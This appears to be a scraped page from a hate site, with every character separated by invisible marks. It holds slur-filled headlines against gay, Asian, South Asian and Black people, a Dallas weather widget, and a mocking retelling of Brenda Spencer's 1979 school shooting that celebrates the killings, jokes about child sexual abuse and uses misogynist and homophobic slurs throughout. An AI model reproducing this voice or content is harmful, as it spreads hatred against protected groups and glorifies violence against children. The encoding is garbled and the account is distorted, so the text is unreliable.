H‚Äéo‚Äép‚Äée‚Äéf‚Äéu‚Äél‚Äél‚Äéy‚Äé ‚Äéo‚Äén‚Äéc‚Äée‚Äé ‚Äéa‚Äél‚Äél‚Äé ‚Äéf‚Äéa‚Äég‚Äég‚Äéo‚Äét‚Äér‚Äéy‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äée‚Äén‚Äéd‚Äée‚Äéd‚Äé,‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äéw‚Äéo‚Äén‚Äé'‚Äét‚Äé ‚Äéh‚Äéa‚Äép‚Äép‚Äée‚Äén‚Äé ‚Äéa‚Äég‚Äéa‚Äéi‚Äén‚Äé.‚Äé


D‚Äée‚Äél‚Äéa‚Äéw‚Äéa‚Äér‚Äée‚Äé ‚ÄéD‚Äéi‚Äén‚Äéd‚Äéu‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéS‚Äét‚Äéu‚Äéf‚Äéf‚Äéi‚Äén‚Äég‚Äé ‚ÄéD‚Äée‚Äéa‚Äéd‚Äé ‚ÄéW‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚ÄéW‚Äéo‚Äém‚Äéa‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚ÄéH‚Äéi‚Äés‚Äé ‚ÄéC‚Äéa‚Äér‚Äé.‚Äé


M‚Äéi‚Äéc‚Äéh‚Äéi‚Äég‚Äéa‚Äén‚Äé:‚Äé ‚ÄéS‚Äép‚Äéi‚Äéc‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äé6‚Äét‚Äéh‚Äé ‚ÄéD‚ÄéU‚ÄéI‚Äé.‚Äé


S‚Äée‚Äéa‚Äét‚Äét‚Äél‚Äée‚Äé:‚Äé ‚Äé2‚Äé6‚Äé ‚ÄéC‚Äéh‚Äéi‚Äén‚Äék‚Äé ‚ÄéB‚Äéi‚Äét‚Äéc‚Äéh‚Äée‚Äés‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéi‚Äén‚Äé ‚ÄéM‚Äéa‚Äés‚Äés‚Äéa‚Äég‚Äée‚Äé ‚ÄéP‚Äéa‚Äér‚Äél‚Äéo‚Äér‚Äé ‚ÄéH‚Äéu‚Äém‚Äéa‚Äén‚Äé ‚ÄéT‚Äér‚Äéa‚Äéf‚Äéf‚Äéi‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚ÄéB‚Äéu‚Äés‚Äét‚Äé.‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéW‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé.‚Äé

1‚Äé0‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé ‚ÄéW‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé-‚ÄéD‚Äéa‚Äél‚Äée‚Äé,‚Äé ‚ÄéT‚ÄéX‚Äé
A‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äé7‚Äé:‚Äé5‚Äé6‚Äé ‚Äéa‚Äém‚Äé ‚ÄéC‚ÄéD‚ÄéT‚Äé
T‚Äéo‚Äéd‚Äéa‚Äéy‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé
6‚Äé8‚Äé¬∞‚Äé
/‚Äé4‚Äé5‚Äé¬∞‚Äé
1‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé2‚Äé6‚Äé ‚Äé|‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé
6‚Äé8‚Äé¬∞‚Äé
1‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé
1‚Äé2‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé.‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚Äé6‚Äé8‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéN‚ÄéN‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé1‚Äé0‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé5‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé
 ‚Äé
H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
4‚Äé9‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
9‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
S‚Äéu‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
7‚Äé:‚Äé2‚Äé5‚Äé ‚Äéa‚Äém‚Äé
S‚Äéu‚Äén‚Äés‚Äée‚Äét‚Äé
7‚Äé:‚Äé4‚Äé5‚Äé ‚Äép‚Äém‚Äé
T‚Äéu‚Äée‚Äé ‚Äé2‚Äé6‚Äé ‚Äé|‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äé
4‚Äé5‚Äé¬∞‚Äé
5‚Äé%‚Äé
N‚ÄéE‚Äé
7‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
C‚Äél‚Äée‚Äéa‚Äér‚Äé ‚Äét‚Äéo‚Äé ‚Äép‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé.‚Äé ‚ÄéL‚Äéo‚Äéw‚Äé ‚Äén‚Äée‚Äéa‚Äér‚Äé ‚Äé4‚Äé5‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéN‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé5‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé
 ‚Äé
H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
7‚Äé1‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
0‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
M‚Äéo‚Äéo‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
9‚Äé:‚Äé1‚Äé3‚Äé ‚Äép‚Äém‚Äé
W‚Äéa‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéG‚Äéi‚Äéb‚Äéb‚Äéo‚Äéu‚Äés‚Äé
M‚Äéo‚Äéo‚Äén‚Äés‚Äée‚Äét‚Äé
8‚Äé:‚Äé0‚Äé6‚Äé ‚Äéa‚Äém‚Äé
W‚Äée‚Äéd‚Äé ‚Äé2‚Äé7‚Äé
A‚ÄéM‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äés‚Äé/‚ÄéP‚ÄéM‚Äé ‚ÄéS‚Äéu‚Äén‚Äé
6‚Äé9‚Äé¬∞‚Äé
/‚Äé4‚Äé5‚Äé¬∞‚Äé
1‚Äé6‚Äé%‚Äé
W‚ÄéS‚ÄéW‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé2‚Äé8‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé
7‚Äé7‚Äé¬∞‚Äé
/‚Äé5‚Äé6‚Äé¬∞‚Äé
9‚Äé%‚Äé
S‚Äé ‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé2‚Äé9‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé8‚Äé¬∞‚Äé
/‚Äé5‚Äé9‚Äé¬∞‚Äé
1‚Äé3‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé3‚Äé0‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé2‚Äé¬∞‚Äé
/‚Äé6‚Äé3‚Äé¬∞‚Äé
8‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé3‚Äé1‚Äé
C‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé2‚Äé¬∞‚Äé
/‚Äé6‚Äé8‚Äé¬∞‚Äé
1‚Äé9‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé0‚Äé1‚Äé
C‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
9‚Äé1‚Äé¬∞‚Äé
/‚Äé6‚Äé6‚Äé¬∞‚Äé
8‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé0‚Äé2‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé7‚Äé¬∞‚Äé
/‚Äé5‚Äé3‚Äé¬∞‚Äé
2‚Äé1‚Äé%‚Äé
N‚Äé ‚Äé1‚Äé5‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé0‚Äé3‚Äé
A‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
7‚Äé1‚Äé¬∞‚Äé
/‚Äé4‚Äé9‚Äé¬∞‚Äé
3‚Äé5‚Äé%‚Äé
N‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé0‚Äé4‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé
7‚Äé4‚Äé¬∞‚Äé
/‚Äé5‚Äé2‚Äé¬∞‚Äé
1‚Äé1‚Äé%‚Äé
N‚ÄéE‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé0‚Äé5‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé9‚Äé¬∞‚Äé
/‚Äé5‚Äé6‚Äé¬∞‚Äé
5‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé0‚Äé6‚Äé
P‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
7‚Äé8‚Äé¬∞‚Äé
/‚Äé6‚Äé3‚Äé¬∞‚Äé
3‚Äé8‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé0‚Äé7‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé3‚Äé¬∞‚Äé
/‚Äé6‚Äé2‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé0‚Äé8‚Äé
I‚Äés‚Äéo‚Äél‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé3‚Äé¬∞‚Äé
/‚Äé6‚Äé1‚Äé¬∞‚Äé
3‚Äé3‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé0‚Äé9‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé7‚Äé¬∞‚Äé
/‚Äé5‚Äé7‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
E‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

C‚Äéu‚Äér‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äé:‚Äé ‚ÄéP‚Äéa‚Äék‚Äéi‚Äé ‚ÄéH‚Äéa‚Äéc‚Äék‚Äée‚Äér‚Äés‚Äé.‚Äé ‚Äéüßîüèæ‚Äç‚ôÇÔ∏è

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

B‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚ÄéA‚Äén‚Äén‚Äé ‚ÄéS‚Äép‚Äée‚Äén‚Äéc‚Äée‚Äér‚Äé
B‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚ÄéA‚Äén‚Äén‚Äé ‚ÄéS‚Äép‚Äée‚Äén‚Äéc‚Äée‚Äér‚Äé ‚Äé(‚Äéa‚Äé.‚Äék‚Äé.‚Äéa‚Äé.‚Äé ‚ÄéT‚Äéh‚Äée‚Äé ‚ÄéG‚Äéa‚Äér‚Äéf‚Äéi‚Äée‚Äél‚Äéd‚Äé ‚ÄéK‚Äéi‚Äél‚Äél‚Äée‚Äér‚Äé)‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéa‚Äén‚Äé ‚Äée‚Äéd‚Äég‚Äéy‚Äé ‚Äé1‚Äé6‚Äé-‚Äéy‚Äée‚Äéa‚Äér‚Äé-‚Äéo‚Äél‚Äéd‚Äé ‚Äél‚Äée‚Äés‚Äéb‚Äéi‚Äéa‚Äén‚Äé ‚Äég‚Äéi‚Äén‚Äég‚Äée‚Äér‚Äé ‚Äéw‚Äéh‚Äéo‚Äés‚Äée‚Äé ‚Äér‚Äée‚Äét‚Äéa‚Äér‚Äéd‚Äée‚Äéd‚Äé ‚Äéa‚Äél‚Äéc‚Äéo‚Äéh‚Äéo‚Äél‚Äéi‚Äéc‚Äé ‚Äéd‚Äéa‚Äéd‚Äéd‚Äéy‚Äé ‚Äém‚Äéa‚Äéd‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äér‚Äéi‚Äél‚Äél‚Äéi‚Äéa‚Äén‚Äét‚Äé ‚Äéd‚Äée‚Äéc‚Äéi‚Äés‚Äéi‚Äéo‚Äén‚Äé ‚Äét‚Äéo‚Äé ‚Äéb‚Äéu‚Äéy‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äéa‚Äé ‚Äér‚Äéi‚Äéf‚Äél‚Äée‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚ÄéC‚Äéh‚Äér‚Äéi‚Äés‚Äét‚Äém‚Äéa‚Äés‚Äé ‚Äéd‚Äée‚Äés‚Äép‚Äéi‚Äét‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéa‚Äéc‚Äét‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéh‚Äée‚Äé ‚Äéh‚Äéa‚Äéd‚Äé ‚Äéb‚Äée‚Äée‚Äén‚Äé ‚Äém‚Äéo‚Äél‚Äée‚Äés‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äés‚Äé.‚Äé ‚ÄéO‚Äén‚Äé ‚ÄéM‚Äéo‚Äén‚Äéd‚Äéa‚Äéy‚Äé,‚Äé ‚ÄéJ‚Äéa‚Äén‚Äéu‚Äéa‚Äér‚Äéy‚Äé ‚Äé2‚Äé9‚Äé,‚Äé ‚Äé1‚Äé9‚Äé7‚Äé9‚Äé,‚Äé ‚Äéf‚Äéi‚Äén‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äéf‚Äée‚Äéd‚Äé ‚Äéu‚Äép‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéy‚Äée‚Äéa‚Äér‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äéa‚Äéb‚Äéu‚Äés‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéh‚Äéi‚Äég‚Äéh‚Äé ‚Äéa‚Äés‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äé ‚Äéo‚Äén‚Äé ‚Äéa‚Äé ‚Äéc‚Äéo‚Äém‚Äéb‚Äéi‚Äén‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéP‚ÄéC‚ÄéP‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äél‚Äéc‚Äéo‚Äéh‚Äéo‚Äél‚Äé,‚Äé ‚ÄéB‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚Äéd‚Äée‚Äéc‚Äéi‚Äéd‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéa‚Äék‚Äée‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äéb‚Äér‚Äéa‚Äén‚Äéd‚Äé-‚Äés‚Äép‚Äéa‚Äén‚Äék‚Äéi‚Äén‚Äég‚Äé-‚Äén‚Äée‚Äéw‚Äé ‚ÄéR‚Äéu‚Äég‚Äée‚Äér‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äée‚Äén‚Äéd‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äém‚Äéi‚Äés‚Äée‚Äér‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚Äél‚Äéi‚Äéf‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äés‚Äét‚Äéy‚Äél‚Äée‚Äé.‚Äé ‚ÄéB‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äéo‚Äé ‚Äém‚Äéu‚Äéc‚Äéh‚Äé ‚Äéo‚Äéf‚Äé ‚Äéa‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äép‚Äéu‚Äés‚Äés‚Äéy‚Äé ‚Äét‚Äéo‚Äé ‚Äéj‚Äéu‚Äés‚Äét‚Äé ‚Äéb‚Äél‚Äéo‚Äéw‚Äé ‚Äéa‚Äé ‚Äéh‚Äéo‚Äél‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äéd‚Äéa‚Äéd‚Äéd‚Äéy‚Äé'‚Äés‚Äé ‚Äéh‚Äée‚Äéa‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéf‚Äée‚Äée‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéi‚Äét‚Äé ‚Äéw‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äéb‚Äée‚Äé ‚Äét‚Äéo‚Äéo‚Äé ‚Äéh‚Äée‚Äét‚Äée‚Äér‚Äéo‚Äés‚Äée‚Äéx‚Äéu‚Äéa‚Äél‚Äé ‚Äét‚Äéo‚Äé ‚Äés‚Äét‚Äéi‚Äéc‚Äék‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äéa‚Äér‚Äér‚Äée‚Äél‚Äé ‚Äéo‚Äéf‚Äé ‚Äéa‚Äé ‚Äég‚Äéu‚Äén‚Äé ‚Äéi‚Äén‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äém‚Äéo‚Äéu‚Äét‚Äéh‚Äé,‚Äé ‚ÄéB‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚Äéi‚Äén‚Äés‚Äét‚Äée‚Äéa‚Äéd‚Äé ‚Äéd‚Äée‚Äéc‚Äéi‚Äéd‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äés‚Äéh‚Äée‚Äé ‚Äéw‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äéo‚Äél‚Äéi‚Äéc‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéd‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéj‚Äéo‚Äéb‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéh‚Äée‚Äér‚Äé.‚Äé

S‚Äée‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äés‚Äé ‚Äés‚Äéh‚Äée‚Äé ‚Äél‚Äéi‚Äév‚Äée‚Äéd‚Äé ‚Äéd‚Äéi‚Äér‚Äée‚Äéc‚Äét‚Äél‚Äéy‚Äé ‚Äéa‚Äéc‚Äér‚Äéo‚Äés‚Äés‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéG‚Äér‚Äéo‚Äév‚Äée‚Äér‚Äé ‚ÄéC‚Äél‚Äée‚Äév‚Äée‚Äél‚Äéa‚Äén‚Äéd‚Äé ‚ÄéE‚Äél‚Äée‚Äém‚Äée‚Äén‚Äét‚Äéa‚Äér‚Äéy‚Äé ‚ÄéS‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äé ‚Äéi‚Äén‚Äé ‚ÄéS‚Äéa‚Äén‚Äé ‚ÄéD‚Äéi‚Äée‚Äég‚Äéo‚Äé,‚Äé ‚ÄéB‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚Äéd‚Äée‚Äéc‚Äéi‚Äéd‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéa‚Äés‚Äét‚Äée‚Äés‚Äét‚Äé ‚Äéw‚Äéa‚Äéy‚Äé ‚Äét‚Äéo‚Äé ‚Äég‚Äée‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äép‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äéc‚Äéo‚Äém‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéb‚Äél‚Äéo‚Äéw‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äéb‚Äér‚Äéa‚Äéi‚Äén‚Äés‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äéw‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äéb‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äés‚Äén‚Äéi‚Äép‚Äée‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚Äés‚Äéq‚Äéu‚Äée‚Äéa‚Äék‚Äée‚Äér‚Äés‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéo‚Äém‚Äéf‚Äéo‚Äér‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äéh‚Äée‚Äér‚Äé ‚Äéb‚Äée‚Äéd‚Äér‚Äéo‚Äéo‚Äém‚Äé.‚Äé ‚ÄéU‚Äén‚Äéf‚Äéo‚Äér‚Äét‚Äéu‚Äén‚Äéa‚Äét‚Äée‚Äél‚Äéy‚Äé,‚Äé ‚Äéd‚Äée‚Äés‚Äép‚Äéi‚Äét‚Äée‚Äé ‚Äém‚Äéa‚Äén‚Äéa‚Äég‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚Äék‚Äéi‚Äél‚Äél‚Äé ‚Äéb‚Äéo‚Äét‚Äéh‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äéc‚Äéh‚Äéo‚Äéo‚Äél‚Äé ‚Äép‚Äér‚Äéi‚Äén‚Äéc‚Äéi‚Äép‚Äéa‚Äél‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéu‚Äés‚Äét‚Äéo‚Äéd‚Äéi‚Äéa‚Äén‚Äé,‚Äé ‚ÄéB‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚Äéh‚Äéa‚Äéd‚Äé ‚Äén‚Äée‚Äég‚Äél‚Äée‚Äéc‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéo‚Äé ‚Äéf‚Äéa‚Äéc‚Äét‚Äéo‚Äér‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéa‚Äéc‚Äét‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äéo‚Äél‚Äéi‚Äéc‚Äée‚Äé ‚Äéi‚Äén‚Äé ‚ÄéC‚Äéo‚Äém‚Äém‚Äéi‚Äée‚Äéf‚Äéo‚Äér‚Äén‚Äéi‚Äéa‚Äé ‚Äéw‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äéb‚Äée‚Äé ‚Äét‚Äéo‚Äéo‚Äé ‚Äéf‚Äéu‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äés‚Äéo‚Äéf‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äés‚Äéh‚Äéo‚Äéo‚Äét‚Äé ‚Äéa‚Äé ‚Äé1‚Äé6‚Äé-‚Äéy‚Äée‚Äéa‚Äér‚Äé-‚Äéo‚Äél‚Äéd‚Äé ‚Äéw‚Äéh‚Äéi‚Äét‚Äée‚Äé ‚Äéb‚Äéi‚Äét‚Äéc‚Äéh‚Äé ‚Äée‚Äév‚Äée‚Äén‚Äé ‚Äéi‚Äéf‚Äé ‚Äés‚Äéh‚Äée‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äés‚Äéh‚Äéo‚Äéo‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéd‚Äéi‚Äér‚Äée‚Äéc‚Äét‚Äél‚Äéy‚Äé ‚Äéa‚Äét‚Äé ‚Äéc‚Äéh‚Äéi‚Äél‚Äéd‚Äér‚Äée‚Äén‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéo‚Äép‚Äés‚Äé.‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚Äéb‚Äée‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéa‚Äés‚Äék‚Äée‚Äéd‚Äé ‚Äéw‚Äéh‚Äéy‚Äé ‚Äés‚Äéh‚Äée‚Äé ‚Äéd‚Äéi‚Äéd‚Äé ‚Äéi‚Äét‚Äé,‚Äé ‚ÄéB‚Äér‚Äée‚Äén‚Äéd‚Äéa‚Äé ‚Äér‚Äée‚Äés‚Äép‚Äéo‚Äén‚Äéd‚Äée‚Äéd‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéu‚Äén‚Äéf‚Äéo‚Äér‚Äég‚Äée‚Äét‚Äét‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚Äép‚Äéh‚Äér‚Äéa‚Äés‚Äée‚Äé ‚Äé""‚ÄéI‚Äé ‚Äéd‚Äéo‚Äén‚Äé'‚Äét‚Äé ‚Äél‚Äéi‚Äék‚Äée‚Äé ‚ÄéM‚Äéo‚Äén‚Äéd‚Äéa‚Äéy‚Äés‚Äé.‚Äé""‚Äé

